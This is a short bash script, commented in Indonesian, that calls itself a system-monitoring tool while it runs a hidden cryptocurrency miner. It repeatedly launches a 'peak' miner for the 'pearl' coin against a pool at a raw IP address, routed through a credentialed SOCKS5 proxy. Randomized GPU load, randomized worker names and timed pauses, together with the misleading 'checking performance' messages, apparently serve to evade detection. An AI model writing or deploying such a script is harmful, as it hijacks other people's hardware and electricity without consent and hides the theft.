#!/bin/bash

echo "Memulai sistem monitoring dengan penggunaan GPU acak..."

while true; do
    # Acak penggunaan GPU antara 50-70%
    gpu_percent=$((RANDOM % 21 + 50))
    
    echo "Memeriksa kinerja sistem dengan $gpu_percent% GPU"
    
    # Jalankan miner dengan parameter acak
    ./peak --coin pearl --url 192.210.169.184:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999999) --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443 --gpu-percent=$gpu_percent --max-threads=2 &
    
    # Tunggu 30-60 menit (1800-3600 detik)
    wait_time=$((RANDOM % 1800 + 1800))
    echo "Menunggu $((wait_time/60)) menit..."
    sleep $wait_time
    
    # Hentikan proses mining
    pkill -f peak
    echo "Pemeriksaan selesai"
done
